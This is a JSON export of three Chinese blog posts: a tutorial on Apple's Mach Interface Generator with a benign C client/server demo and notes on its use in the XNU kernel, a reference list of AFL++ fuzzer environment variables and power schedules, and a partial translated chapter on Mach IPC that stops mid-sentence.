{"posts":[{"title":"MIG","text":"前言最近在看XNU内核相关的漏洞，遇到了MIG生成器，虽然漏洞分析文章也讲了一些，但感觉还是有必要系统的学习记录一下。内容参考OS Internals一书。 0x1 MIGMach Interface Generator（MIG）是一个工具，作用是按照.defs文件中的定义为Mach IPC生成RPC代码。.defs文件包含消息传递和过程接口调用规范，能够为消息的发送接收处理自动生成代码，降低了编程错误的可能性。 MIG在语法上类似于Pascal，生成C语言代码，MIG不会对程序员隐藏底层IPC。 1.1 规范文件文件通常以后缀.defs结尾，MIG解析.defs文件后，主要生成以下三个文件： 客户端代码包含的头文件 与客户端代码链接的用户界面模块，包含向服务器请求消息和接收回复的功能 与服务端代码链接的服务器接口模块，包含用于接收来自客户端的请求、用于根据请求消息的内容调用适当的服务器函数（程序员提供），以及用于发送回复消息的功能。 MIG文件包含以下类型，并不是强制性的： Subsystem identifier（子系统标识符） Serverdemux declaration（Server解复用声明） Type specifications（Type规格） Import declarations（导入声明） Operation descriptions（操作描述） Options declarations（选项声明） 1.1.1 Subsystem子系统是客户端、客户端调用的服务器以及服务器导出的操作集的统称，subsystem关键字命名了文件所指定的MIG子系统。MIG在其生成的代码文件的名称中使用这个标识符作为前缀。 1subsystem system-name message-base-id; subsystem关键字后面是被定义的子系统的ASCII名称（例如，foo）。 message-base-id是整数基值，用作规范文件中第一个操作的IPC消息标识（消息头中的msgh_id字段）。换句话说，这个值是操作顺序编号的基数。message-base-id可以任意选择。然而，如果同一个程序为多个接口服务，那么每个接口必须有一个唯一的标识符，这样服务器就可以明确地确定所调用的操作。 当MIG创建一个与请求信息相对应的回复信息时，回复标识符通常是请求标识符和数字100的总和。 1.1.2 Serverdemuxserverdemux声明部分可以用来为server-interface模块中的server demultiplexing routine（服务器解复用例程）指定一个替代名称。解复用例程检查请求消息，根据消息头中的msgh_id值，调用适当的子系统例程。如果该值超出了子系统的范围，解复用例程会返回一个错误。该例程的默认名称是&lt;system-name&gt;_server，其中&lt;system-name&gt;是通过子系统语句指定的名称。 1serverdemux somethingelse_server; 1.1.3 Type specifications类型规范用于定义与用户界面模块输出的函数调用的参数相对应的数据类型。MIG支持诸如简单、结构化、指针和多态等类型的声明。 12345678910111213141516171819/* * Simple Types * type type-name = type-description; */ type int = MACH_MSG_TYPE_INTEGER_32; type kern_return_t = int; type some_string = (MACH_MSG_TYPE_STRING, 8*128); /* * Structured and Pointer Types * type type-name = array [size] of type-description; * type type-name = array [*:maxsize] of type-description; * struct [size] of type-description; * type type-name = ^ type-description; */ type thread_ids = array[16] of MACH_MSG_TYPE_INTEGER_32; type a_structure = struct[16] of array[8] of int; type ool_array = ^ array[] of MACH_MSG_TYPE_INTEGER_32; type intptr = ^ MACH_MSG_TYPE_INTEGER_32; type input_string = array[*:64] of char; 多态类型用于指定一个参数，该参数的确切类型在运行时才会确定。MIG自动化包括一个额外的参数来适应这种情况。考虑一下下面这种情况。 123456789/* foo.defs */ subsystem foo 500 #include &lt;mach/std_types.defs&gt; #include &lt;mach/mach_types.defs&gt; type my_poly_t = polymorphic; routine foo_func( server : mach_port_t; arg : my_poly_t); MIG生成的foo_func()的代码有如下原型。 1kern_return_t foo_func( mach_port_t server, my_poly_t arg, mach_msg_type_name_t argPoly); 一个类型声明可以选择性地包含指定翻译或取消分配类型的程序的信息。翻译允许一个类型被用户和服务器界面模块以不同的方式看到。取消分配规范允许指定一个析构函数。 1.1.4 Import declarations导入声明是用来在MIG生成的模块中包含头文件的。MIG可以被指示在用户和服务器界面模块中都包含这样的头文件，也可以只在这两个模块中包含一个。 123456789/* * import header-file; * uimport header-file; * simport header-file; */ import &quot;foo.h&quot;; /* imported in both modules */ uimport &lt;stdlib.h&gt;; /* only in user-interface module */ simport &lt;stdio.h&gt;; /* only in server-interface module */ 1.1.5 Operation descriptions操作描述包含一个或多个类型的IPC操作的规范。规范包括描述操作种类的关键字，操作的名称，以及参数的名称和类型。当MIG编译规范文件时，它会为每个操作生成客户和服务器存根。客户端存根存在于用户界面模块中。它的工作是打包并发送与客户程序中的过程调用对应的消息。服务器存根驻留在服务器界面模块中。它对收到的消息进行解包，并调用程序员的服务器代码来实现该操作。 MIG支持的操作类型包括例程、简单例程、程序、简单程序和函数。 Operation Type Reply Received? Error Returned? Routine Yes Yes, a kern_return_t return value specifying whether the operation was successfully completed SimpleRoutine No Yes, the return value from Mach’s message-sending primitive Procedure Yes No SimpleProcedure No No Function Yes No error code returned, but a value from the server function is returned 操作声明的例子： 1routine vm_allocate(target_task:vm_task_entry_t; inout address:vm_address_t; size:vm_size_t; flags:int); 一个参数说明包含一个名称和一个类型，并且可以选择用一个关键字in、out或inout来装饰，分别代表该参数只发送给服务器，或由服务器在离开时发送，或两者都发送。 在操作部分，skip关键字会使MIG跳过下一个操作ID的分配，导致操作ID序列中出现漏洞。这对于在接口发展过程中保持兼容性很有帮助。 1.1.6 Options declarations选项声明用于指定影响生成代码的特殊目的或全局选项。下面是一些选项的例子： WaitTime用于指定用户界面代码等待从服务器收到回复的最长时间，单位为毫秒。 MsgType用于设置消息类型（例如，将消息标记为加密的）。 UserPrefix用于指定一个字符串，该字符串将是调用IPC操作的客户端函数名称的前缀。 ServerPrefix用于指定一个字符串，它将是实现IPC操作的服务器端函数名称的前缀。 Rcsid用于指定一个字符串，它将导致在服务器和用户模块中分别声明名为Sys_server_rcsid和Sys_user_rcsid的静态字符串变量，它们的常量值都是指定的字符串。 更多关于MIG规范文件的例子可以查看/usr/include/mach/及其子目录。 0x2 Demo接下来使用MIG创建一个简单的客户-服务器系统。 MIG服务器是一个Mach任务，使用MIG生成的RPC接口向其客户提供服务。MIG服务器则提供两个例程：一个是计算客户端发送的字符串的长度，另一个是计算客户端发送的数字的阶乘。在这个例子中，客户端将内联发送字符串，而服务器将只发送简单的整数。回顾一下，当一个接口调用返回out-of-line数据时，调用者有责任通过调用vm_deallocate()来取消内存分配。例如，我们可以给我们的接口添加另一个操作，比如说，将客户端发送的字符串反转，并通过在调用者的地址空间为其分配内存来返回反转的字符串。 源代码由以下四个文件组成： 一个头文件包含了客户端和服务器端使用的有用定义和原型（misc_types.h）。 MIG规范文件（misc.defs）。 服务器的设置和主循环(server.c) 接口的演示（client.c） 下面给出了通用头文件。我们定义了两个新的数据类型：input_string_t，它是一个大小为64个元素的字符数组；xput_number_t，它是int的别名。 123456789101112131415161718192021222324252627282930313233// misc_types.h #ifndef _MISC_TYPES_H_ #define _MISC_TYPES_H_ #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;mach/mach.h&gt; #include &lt;servers/bootstrap.h&gt; // The server port will be registered under this name. #define MIG_MISC_SERVICE &quot;MIG-miscservice&quot; // Data representations typedef char input_string_t[64]; typedef intxput_number_t; typedef struct { mach_msg_header_t head; // The following fields do not represent the actual layout of the request // and reply messages that MIG will use. However, a request or reply // message will not be larger in size than the sum of the sizes of these // fields. We need the size to put an upper bound on the size of an // incoming message in a mach_msg() call. NDR_record_t NDR; union { input_string_t string; xput_number_tnumber; } data; kern_return_t RetCode; mach_msg_trailer_t trailer; } msg_misc_t; xput_number_t misc_translate_int_to_xput_number_t(int); int misc_translate_xput_number_t_to_int(xput_number_t); void misc_remove_reference(xput_number_t); kern_return_t string_length(mach_port_t, input_string_t, xput_number_t *); kern_return_t factorial(mach_port_t, xput_number_t, xput_number_t *); #endif // _MISC_TYPES_H_ 下面给出了规范文件。注意xput_number_t的类型说明。每个MIG类型最多可以有三个对应的C类型：一个用于用户界面模块的类型（由CUserType选项指定），一个用于服务器模块的类型（由CServerType选项指定），以及一个供服务器例程内部使用的转换类型。如果CType选项与CUserType和CServerType的类型相同，可以用它来代替。在我们的例子中，CType选项指定了MIG类型xput_number_t的C数据类型。 123456789101112131415161718192021222324252627282930313233343536373839/* * A &quot;Miscellaneous&quot; Mach Server */ /* * File: misc.defs * Purpose: Miscellaneous Server subsystem definitions */ /* * Subsystem identifier */ Subsystem misc 500; /* * Type declarations */ #include &lt;mach/std_types.defs&gt; #include &lt;mach/mach_types.defs&gt; type input_string_t = array[64] of char; type xput_number_t = int CType:int InTran:xput_number_t misc_translate_int_to_xput_number_t(int) OutTran:int misc_translate_xput_number_t_to_int(xput_number_t)Destructor:misc_remove_reference(xput_number_t); /* * Import declarations */ import &quot;misc_types.h&quot;; /* * Operation descriptions *//* This should be operation #500 */ routine string_length(server_port:mach_port_t; in instring:input_string_t; out len:xput_number_t); /* Create some holes in operation sequence */ Skip; Skip; Skip; /* This should be operation #504, as there are three Skip's */ routine factorial(server_port:mach_port_t; in num:xput_number_t; out fac:xput_number_t);/* * Option declarations */ ServerPrefix Server_; UserPrefix Client_; 我们使用InTran、OutTran和Destructor选项来指定我们将为翻译和取消分配提供的程序。当一个类型必须被服务器和客户端以不同的方式看待时，转换是非常有用的。在我们的例子中，我们希望有关的类型对服务器来说是xput_number_t，对客户端来说是int。我们使用InTran指定 misc_translate_int_to_xput_number_t() 作为该类型的传入翻译程序。同样地，misc_translate_xput_number_t_to_int()是输出的翻译例程。由于xput_number_t在我们的例子中实际上只是int的另一个名字，我们的翻译函数是微不足道的：它们只是打印一条信息。 内核大量使用了翻译函数。 我们还使用Destructor选项来指定一个MIG将在适当时候调用的取消分配函数。服务器源码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354// server.c #include &quot;misc_types.h&quot; static mach_port_t server_port; extern boolean_t misc_server(mach_msg_header_t *inhdr, mach_msg_header_t *outhdr); void server_setup(void) { kern_return_t kr; if ((kr = bootstrap_create_service(bootstrap_port, MIG_MISC_SERVICE, &amp;server_port)) != BOOTSTRAP_SUCCESS){ mach_error(&quot;bootstrap_create_service:&quot;, kr); exit(1); } if ((kr = bootstrap_check_in(bootstrap_port, MIG_MISC_SERVICE, &amp;server_port)) != BOOTSTRAP_SUCCESS) { mach_port_deallocate(mach_task_self(), server_port); mach_error(&quot;bootstrap_check_in:&quot;, kr); exit(1); } } void server_loop(void) { mach_msg_server(misc_server, // call the server-interface module sizeof(msg_misc_t), // maximum receive size server_port, // port to receive on MACH_MSG_TIMEOUT_NONE); // options } // InTran xput_number_t misc_translate_int_to_xput_number_t(int param) { printf(&quot;misc_translate_incoming(%d)\\n&quot;, param); return (xput_number_t)param; } // OutTran int misc_translate_xput_number_t_to_int(xput_number_t param) { printf(&quot;misc_translate_outgoing(%d)\\n&quot;, (int)param); return (int)param; } // Destructor void misc_remove_reference(xput_number_t param) { printf(&quot;misc_remove_reference(%d)\\n&quot;, (int)param); } // an operation that we export kern_return_t string_length(mach_port_t server_port, input_string_t instring, xput_number_t *len) { char *in = (char *)instring; if (!in || !len) return KERN_INVALID_ADDRESS; *len = 0; while (*in++) (*len)++; return KERN_SUCCESS; } // an operation that we export kern_return_t factorial(mach_port_t server_port, xput_number_t num, xput_number_t *fac) { int i; if (!fac) return KERN_INVALID_ADDRESS; *fac = 1; for (i = 2; i &lt;= num; i++) *fac *= i; return KERN_SUCCESS; } int main(void) { server_setup(); server_loop(); exit(0);} 下面给出了程序员提供的，将用来调用服务器接口例程的客户端的源代码： 1234567891011121314151617181920212223242526// client.c #include &quot;misc_types.h&quot; #define INPUT_STRING &quot;Hello, MIG!&quot; #define INPUT_NUMBER 5 int main(int argc, char **argv) { kern_return_t kr; mach_port_t server_port; int len, fac; // look up the service to find the server's port if ((kr = bootstrap_look_up(bootstrap_port, MIG_MISC_SERVICE, &amp;server_port)) != BOOTSTRAP_SUCCESS) { mach_error(&quot;bootstrap_look_up:&quot;, kr); exit(1); } // call a procedure if ((kr = string_length(server_port, INPUT_STRING, &amp;len)) != KERN_SUCCESS) mach_error(&quot;string_length:&quot;, kr); else printf(&quot;length of \\&quot;%s\\&quot; is %d\\n&quot;, INPUT_STRING, len); // call another procedure if ((kr = factorial(server_port, INPUT_NUMBER, &amp;fac)) != KERN_SUCCESS) mach_error(&quot;factorial:&quot;, kr); else printf(&quot;factorial of %d is %d\\n&quot;, INPUT_NUMBER, fac); mach_port_deallocate(mach_task_self(), server_port); exit(0); } 接下来，我们必须在规范文件上运行MIG程序。如图所示，我们将client.c和miscUser.c编译并连接在一起，得到客户端程序。同样地，server.c和miscServer.c产生了服务器程序。 123456789101112131415161718192021222324252627282930313233$ ls -m client.c, misc.defs, misc_types.h, server.c $ mig -v misc.defs Subsystem misc:base = 500 Type int8_t = (9, 8) Type uint8_t = (9, 8) ... Type input_string_t = array [64] of (8, 8) Type xput_number_t = (2, 32) CUserType: int CServerType: int InTran: xput_number_t misc_translate_int_to_xput_number_t(int) OutTran: int misc_translate_xput_number_t_to_int(xput_number_t) Destructor: misc_remove_reference(xput_number_t) Import &quot;misc_types.h&quot; Routine (0) string_length( RequestPort server_port: mach_port_t In instring: input_string Out len: xput_number) Routine (4) factorial( RequestPort server_port: mach_port_t In num: xput_number Out fac: xput_number) ServerPrefix Server_ UserPrefix Client_ Writing misc.h ... done. Writing miscUser.c ... done. Writing miscServer.c ... done. $ ls -m client.c, misc.defs, misc.h, miscServer.c, miscUser.c, misc_types.h, server.c $ gcc -Wall -o server server.c miscServer.c $ gcc -Wall -o client client.c miscUser.c $ ./server 一旦服务器运行，我们也可以使用我们的 bootstrap_info 程序来验证我们的服务名称（MIG-miscservice，定义在 misc_types.h 中）是否被列出。 1234$ bootstrap_info ... 1 MIG-miscservice - $ ./client length of &quot;Hello, MIG!&quot; is 11 factorial of 5 is 120 下图显示了客户端调用服务器的string_length()操作时发生的动作序列： 0x3 内核中的MIGMIG被用来实现大多数Mach的系统调用。一些系统调用，如与任务相关的、与IPC相关的和与VM相关的调用，将目标任务作为其参数之一。MIG根据面向内核的数据类型，在每种情况下翻译任务参数。例如，Mach线程在用户空间中被看作是一个端口名，但在内核中，MIG调用convert_port_to_thread()（osfmk/kern/ipc_tt.c）将传入的线程端口名转换为指向porta thread结构体所代表的内核对象的指针。 1234567/* osfmk/mach/mach_types.defs */ type thread_t = mach_port_t #if KERNEL_SERVER intran: thread_t convert_port_to_thread(mach_port_t) outtran: mach_port_t convert_thread_to_port(thread_t) destructor: thread_deallocate(thread_t) #endif /* KERNEL_SERVER */ 注意KERNEL_SERVER条件指令。Mac OS X内核在MIG规范文件中使用它和一个相关的指令KERNEL_USER来指定KernelServer和KernelUser子系统的修改器。 123456/* osfmk/mach/task.defs */subsystem #if KERNEL_SERVER KernelServer #endif /* KERNEL_SERVER */task 3400; 子系统修改器指示MIG为用户和服务器模块生成特殊环境下的备用代码。例如，当一个MIG服务器例程驻留在内核中时，它被称为在KernelServer环境中。尽管该例程的原型与没有KernelServer修饰符的情况下相同，但后者改变了MIG执行类型转换的方式。在KernelServer子系统的服务器端，一个mach_port_t类型会自动转换为内核类型ipc_port_t。 3.1 内核对象的接口Mach不仅使用端口来表示几种类型的内核对象，而且还通过Mach IPC导出这些对象的接口。这些接口也是用MIG实现的。用户程序可以通过Mach IPC直接使用这些接口，或者，通常情况下，通过调用标准库函数。当系统库被编译时，它链接了与几个内核对象MIG定义文件相对应的用户接口模块。库的构建过程是在定义文件上运行mig，以生成接口模块。 内核对象类型的例子包括thread、task、host、processor、processor set、memory object、semaphore、lock set和clock。定义的内核对象类型的完整列表在osfmk/kern/ipc_kobject.h中。 3.2 内核中的MIG初始化内核为每种类型的内核对象所对应的MIG子系统维护一个mig_subsystem结构体（osfmk/mach/mig.h）。当IPC子系统在内核启动时被初始化，MIG初始化函数mig_init() （osfmk/kern/ipc_kobject.c）遍历每个子系统，填充一个MIG例程的全局哈希表。下面是这个过程的一个例子： 123456789101112131415161718192021222324252627282930313233343536373839404142// osfmk/mach/mig.h typedef struct mig_subsystem { mig_server_routine_t server; // pointer to demux routine mach_msg_id_t start; // minimum routine number mach_msg_id_t end; // maximum routine number + 1 mach_msg_size_t maxsize; // maximum reply message size vm_address_t reserved; // reserved for MIG use mig_routine_descriptor routine[1]; // routine descriptor array } *mig_subsystem_t; // osfmk/kern/ipc_kobject.c typedef struct { mach_msg_id_t num; mig_routine_t routine; int size; #if MACH_COUNTERS mach_counter_t callcount; #endif } mig_hash_t; #define MAX_MIG_ENTRIES 1024 mig_hash_t mig_buckets[MAX_MIG_ENTRIES]; const struct mig_subsystem* mig_e[] = { (const struct mig_subsystem *)&amp;mach_vm_subsystem, (const struct mig_subsystem *)&amp;mach_port_subsystem, (const struct mig_subsystem *)&amp;mach_host_subsystem, ... (const struct mig_subsystem *)&amp;is_iokit_subsystem), ... }; void mig_init(void) { unsigned int i, n = sizeof(mig_e)/sizeof(const struct mig_subsystem *); int howmany; mach_msg_id_t j, pos, nentry, range; for (i = 0; i &lt; n; i++) { // for each mig_e[i] range = mig_e[i]-&gt;end - mig_e[i]-&gt;start; ... for (j = 0; j &lt; range; j++) { // for each routine[j] in mig_e[i] ... // populate mig_buckets hash table with routines } } }","link":"/2022/03/26/9.6MIG%E5%8E%9F%E7%90%86/"},{"title":"AFL++ 阅读笔记","text":"afl-fuzz的环境变量 AFL_SKIP_CPUFREQ：跳过 CPU 扩展策略的检查（不知道是什么），看介绍是指在无法更改系统设置的情况下（如，不是root，没有权限更改），可以跳过检查。 AFL_EXIT_WHEN_DONE：模糊测试有一段时间没有更新了，停止fuzz，UI 中的循环计数器将变为绿色。 AFL_EXIT_ON_TIME：指定时间内（以秒为单位）没有新路径，停止fuzz。 AFL_EXIT_ON_SEED_ISSUES：恢复初始afl-fuzz行为，不允许-i种子中有crash或timeout种子。 AFL_MAP_SIZE：设置 afl-fuzz、afl-showmap、afl-tmin 和 afl-analyze 创建的共享内存的大小，以从目标收集检测数据。必须大于等于编译目标的大小。（这么大？？？） AFL_CMPLOG_ONLY_NEW：只为新发现的测试用例执行昂贵的cmplog功能，而不是为启动时加载的测试用例 ( -i in) 执行。这是恢复fuzz会话时要设置的重要功能。 AFL_TESTCACHE_SIZE：修改config.h中#define TESTCASE_CACHE 的大小。推荐值为 50-250MB - 如果模糊测试发现了大量输入的路径，则建议使用更多。 AFL_DISABLE_TRIM：禁止afl-fuzz修剪测试用例，不推荐。 AFL_NO_AFFINITY：禁止尝试绑定Linux系统上的特定CPU内核，会减慢速度，但是能运行更多的测试用例。 AFL_TRY_AFFINITY：尝试绑定到 Linux 系统上的特定 CPU 内核，如果失败并不会终止。 AFL_NO_AUTODICT：不会加载编译到目标中的 LTO 生成的自动字典。 AFL_HANG_TMOUT：通过指定不同的超时时间来决定特定测试用例是否“挂起”。默认为1秒或-t参数的值，以较大者为准。如果非常关心缓慢的输入，或者如果不希望 AFL++ 花费太多时间对这些东西进行分类，而只是快速地将所有超时放入该 bin 中，则将值调低可能会很有用。 AFL_FORKSRV_INIT_TMOUT：允许你指定一个不同的超时时间来等待forkserver的启动。默认值是 config.h 中 FORK_WAIT_MULT 的 -t 值（通常是 10），所以对于 -t 100，默认会等待 1000 毫秒。如果目标有非常慢的启动时间，例如在进行全系统模糊测试或仿真时，在这里设置不同的时间是很有用的。 AFL_NO_ARITH： AFL++ 跳过大多数确定性算术。这对于加速基于文本的文件格式的模糊测试很有用。 AFL_NO_SNAPSHOT：如果加载了快照 lkm，将建议 afl-fuzz 不要使用快照功能。 AFL_SHUFFLE_QUEUE：在启动时随机重新排序输入队列。什么用？ AFL_TMPDIR：是用来写.cur_input文件的，如果存在的话，则写在正常的输出目录中。你可以用它来指向ramdisk/tmpfs。这可以使速度提高一点，同时也减少了对SSD的压力。 AFL_SKIP_BIN_CHECK：当在使用自定义的插桩方法时，你可以使用 AFL_SKIP_BIN_CHECK 阻止对非插桩的二进制文件和 shell 脚本的检查；以及 AFL_DUMB_FORKSRV 结合 -n 设置，指示 afl-fuzz 仍然遵循 fork 服务器协议而不期望任何插桩数据返回。注意，这也关闭了自动地图大小检测。 AFL_IMPORT_FIRST：当在-M或-S模式下运行时，设置AFL_IMPORT_FIRST会使fuzzer在做其他事情之前从其他实例导入测试案例。这使得用户界面中的 “own finds”计数器更加准确。除了计数器的美观，其他方面不应该有太大变化。 AFL_KILL_SIGNAL：设置超时时要传递给子进程的信号ID。除非是自己实现了目标或插桩，否则不需要设置它。默认情况下，在超时和退出时，SIGKILL（AFL_KILL_SIGNAL=9）将被传递给子进程。 AFL_CUSTOM_MUTATOR_LIBRARY：设置为 afl_custom_fuzz() 的共享库，通过这个库创造额外的突变。如果 afl-fuzz 是用 Python 编译的（在构建 afl-fuzz 时会自动检测），将 AFL_PYTHON_MODULE 设置为一个 Python 模块也可以提供额外的突变。如果 AFL_CUSTOM_MUTATOR_ONLY 也被设置，所有的突变将只由自定义突变器执行。这个功能允许配置自定义突变器，例如对XML或其他高度灵活的结构化输入进行模糊处理。详见 custom_mutators.md。 AFL_FAST_CAL：保持校准阶段大约2.5倍的速度（尽管不那么精确），这在开始对一个慢速目标的训练时可以起到帮助。AFL_CAL_FAST有同样的效果。 AFL_NO_CPU_RED：避免CPU红色警报。 AFL_PATH：在 QEMU 模式 (-Q) 和 Frida 模式 (-O)，AFL_PATH 将被搜索到 afl-qemu-trace 和 afl-frida-trace.so。 AFL_QEMU_CUSTOM_BIN：在 QEMU 模式（-Q），设置 AFL_QEMU_CUSTOM_BIN 会使 afl-fuzz 跳过预置 afl-qemu-trace 到你的命令行。如果你想使用一个自定义的 afl-qemu-trace 或需要修改 afl-qemu-trace 参数，请使用此选项。 AFL_CYCLE_SCHEDULES：每当一个周期结束，就会切换到不同的调度。 AFL_EXPAND_HAVOC_NOW：afl-fuzz在认为有用的情况下，会自动启用这个模式，包括昂贵的突变。 AFL_PRELOAD：导致 AFL++ 为目标二进制文件设置 LD_PRELOAD 而不中断 afl-fuzz 进程本身。除其他外，这对引导 libdislocator.so 是有用的。 AFL_TARGET_ENV：AFL++为目标二进制文件设置额外的环境变量。 AFL_NO_UI：取消用户界面，定期打印一些基本的统计数据。当 afl-fuzz 的输出被重定向到一个文件或管道时，这种行为也会自动触发。 AFL_NO_COLOR/AFL_NO_COLOUR：当配置为 USE_COLOR 而不是 ALWAYS_COLORED 时，将省略控制台输出的着色控制序列。 AFL_FORCE_UI：强制在屏幕上绘制用户界面，即使没有检测到有效的终端（对于虚拟控制台）。 AFL_PERSISTENT_RECORD：如果你使用持久模式，一些目标会保持固有的状态，由于检测到的崩溃测试案例不会在测试案例给出时再次崩溃。为了能够重新触发这些崩溃，你可以使用AFL_PERSISTENT_RECORD变量，该变量的值是在崩溃前保留多少个先前的模糊测试案例。如果设置为例如10，那么先前的9个输入将作为RECORD:0000,cnt:0000到RECORD:0000,cnt:000008被写入out/default/rashes。注意：这个选项需要先在config.h中启用! AFL_IGNORE_PROBLEMS：afl-fuzz 在摸索过程中遇到不正确的摸索设置（不是在启动时），它将终止。设置此选项将阻止afl-fuzz终止。 AFL_I_DONT_CARE_ABOUT_MISSING_CRASHES：如果是Jakub（python-afl），可能需要设置此选项。此外，如果想禁用/proc/sys/kernel/core_pattern检查，也可以设置此选项。 AFL_BENCH_JUST_ONE：仅限基准测试，fuzzer在处理第一个队列条目后退出。 AFL_BENCH_UNTIL_CRASH：仅限基准测试，fuzzer发现第一个崩溃后退出。 AFL_DEBUG_CHILD：将不会阻止子代的输出。这可以看到子系统的所有输出，使设置问题变得可见。例如，在unicornafl线束中，你可能会看到python的堆栈跟踪。你也可以通过这种方式看到其他日志，说明为什么forkerver不能启动。对于调试来说是很好的，需要注意的是，AFL_DEBUG_CHILD_OUTPUT已被废弃。 AFL_AUTORESUME：将恢复一个现有out文件夹的模糊测试（与提供-i -相同），即使提供了不同的-i。如果没有这个设置，afl-fuzz 将会拒绝执行一个long-fuzz的 out 目录。 AFL_MAX_DET_EXRAS：将改变 -x 词典和 LTO autodict（合并）中的元素数量的阈值，概率模式将启动。在概率模式下，并不是所有的字典条目都会被用于模糊突变，以避免减缓模糊突变的速度。默认计数为200个元素。因此，对于200+1个元素，有1/201的机会，其中一个字典条目不会被直接使用。 AFL_NO_FORKSRV：禁用forkerver优化，对每一个被测试的输入恢复到fork + execve()调用。这在处理“不守规矩”的库时非常有用，这些库在初始化时创建线程或做其他疯狂的事情（在插桩指令有机会运行之前）。 AFL_STATSD：启用StatsD指标收集。默认情况下，AFL++将通过UDP发送这些指标到127.0.0.1:8125。主机和端口可以分别用AFL_STATSD_HOST和AFL_STATSD_PORT配置。要启用标签（banner和afl_version），你应该提供与你的StatsD服务器匹配的AFL_STATSD_TAGS_FLAVOR（见AFL_STATSD_TAGS_FLAVOR）。 AFL_STATSD_TAGS_FLAVOR：将AFL_STATSD_TAGS_FLAVOR设置为dogstatsd、librato、signalfx或influxdb中的一个，允许你为你的模糊测试实例添加标签。这在运行多个实例时特别有用（例如，-M/-S）。应用的标签是banner和afl_version。banner对应于通过-M/-S提供的fuzzer的名字。afl_version对应于当前运行的AFL版本（例如++3.0c）。默认（空/不存在）将不给指标添加任何标签。更多信息见rpc_statsd.md。 AFL_CRASH_EXITCODE：设置AFL将退出代码视为崩溃。例如，如果设置了AFL_CRASH_EXITCODE=’-1’，每一个导致-1返回代码的输入（即exit(-1)被调用），将被视为发生了崩溃的情况。 afl++的power schedule由于大多数的输入会触发同样的路径，导致某些路径被触发的频率较高，因此AFL++设计了几种搜索策略，以决定以何种顺序对种子进行模糊测试，以及巧妙地调节从种子生成的输入数量（即，对种子进行模糊测试所花费的时间）的power schedule。我们将种子产生的输入数量称为种子能量。 实现上，修改了种子性能得分 ( calculate_score)的计算，哪个种子被标记为最喜欢的 ( update_bitmap_score)，以及接下来从循环队列中选择哪个种子 ( main)。 实施的调度表（按效果顺序，最好在前）： -p explore -p fast （默认） http://latex.codecogs.com/gif.latex?p(i)=%5Cmin%5Cleft(%5Cfrac%7B%5Calpha(i)%7D%7B%5Cbeta%7D%5Ccdot%5Cfrac%7B2%5E%7Bs(i)%7D%7D%7Bf(i)%7D,M%5Cright) -p coe -p quad -p lin -p exploit (AFL) -p mmopt 实验性：explore对运行时没有权重，并增加了最后 5 个队列条目的权重。 -p rare 实验性：rare将重点放在命中稀有边缘的队列条目上。 -p seek 实验性：seek是 EXPLORE 但忽略队列输入的运行时间，较少关注大小。 更多信息在23rd ACM Conference on Computer and Communications Security (CCS’16)。 其中α(i)是 AFL 用于计算种子输入i的性能分数，β(i)&gt;1是一个常数，s(i)是从队列中选择种子i的次数，f (i)是执行与种子i相同路径的生成输入的数量，μ是执行路径的生成输入的平均数量。 在并行模式下（多个实例共享队列），建议使用exploit时间表（-p exploit）来运行主节点，用cut-exponential（-p coe）、exponential（-p fast；默认）和explore（-p explore）调度的组合来运行从节点。在单一模式下，默认设置就可以了。 在并行模式下，AFLFast似乎表现不佳，因为导入的种子的路径概率估计不正确。希望通过在不同实例间同步估算来解决这个问题。","link":"/2021/11/27/AFL-%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"},{"title":"The Message is the Medium-Mach IPC(the user mode view)","text":"本章概览 A little history Ma-xioms Scenarios Mach Port APIs Message format Sending and receiving message The Mach Interface Generator 正文XNU有两个特性：一是，POSIX/BSD，以及增加的syscall和功能，它是Mach的隐藏特性，但是，它驱动着大量的内核功能，包括下层的BSD层。其主要责任是传递信息。Mach IPC是有史以来开发的最快的IPC机制之一，也是三巨头中最快的。尽管XNU也支持经典的UNIX socket模型，在不考虑便携性的情况下，Mach被广泛地使用。 尽管它们十分重要，但Mach消息API通常被Apple轻视，Apple更愿意去提升高层次的框架wrapper以及最近的XPC。但是低层次上，是Mach消息通过Mach port传递消息。本章的主要目的是对这个奇幻的世界进行概述，而且这个世界从其他角度来看，是Darwin操作系统的一个独立方面。 本章先从介绍消息机制中十分基础的对象开始：端点(endpoint)或端口(port)。它提出了一套简单的设计选择，这些选择必须被接受为公理原则，信息传递将在此基础上进行。因此，出于这些公理原因，消息机制提出了三种常见的方式，以支持对等实体之间的通信建立。这些方式展示了一些端口提供的API，完整的集合在稍后给出。 在解释清楚端口定义之后，本章将聚焦于消息本身 - 介绍消息结构体和它在用户模式下的处理函数。主要聚焦于Mach接口生成器(Mach Interface Generator, MIG)，即处理器允许消息的快速代码生成。MIG有一个令人愉悦的简单接口，其隐藏了大量的不那么令人愉悦的代码。由于这段代码的本质和普遍性，我们将特别关注怎么理解整段代码 - 以及它在逆向时的产物。 本章主要关注用户模式下的情况，其中Mach消息仅仅是能工作。这样能避免接触底层内核的实现方式，因为这需要了解错综复杂的内核结构 - 最好是放在Volume II 中进行解释。 A little historyXNU的基础是NeXTSTEP[1]，并且NeXTSTEP基于Mach。Mach微内核在其加入开源软件基金会之前，是Carnegie Mellon大学的一个研究小组在1985年至1994年之间开发的。Mach项目主页至今仍然在线，仍然保持着古老的WWW网页风格。Mach首次提出是在Usenix上。它一直处于学术范围内，并且，它的文档或者编程环境是十分受限的。Mach3内核准则文档是唯一存在的文档，另一本是绝版书。Carnegie Mellon还保留着一份已出版和未出版的Mach论文清单，提供了关于设计的深刻见解。 [1]NeXTSTEP是由乔布斯在1985年离开苹果后创建的公司，系统基于Mach和BSD。 作为一个微内核，Mach不得不依赖于消息传递机制。在微内核设计中，组件分散在不同的隔离的地址空间中，所以发送与接收消息是它们之间协作完成工作的唯一办法。Mach-er们开发了一个优雅的消息传递机制，主要强调效率和总体上的速度。在消息传递机制中，微内核主要负责接收消息 - 即一小块内存 - 从一个task，然后执行必需的操作将这块内存移动(共享)到另一个task。 NeXTSTEP严格的遵循了微内核的设计理念，但是仅有微内核不能构成一个系统。FreeBSD 4.3被作为一个高层吸纳进来，提供了类似UNIX/POSIX中的进程、线程、信号、文件和套接字。但是在底层，Mach的API保持着可访问性，并允许在内核中单独分离出来，这就是后来的XNU。自此之后，由于XNU的逐步发展，更多的注意力被放在了它的BSD 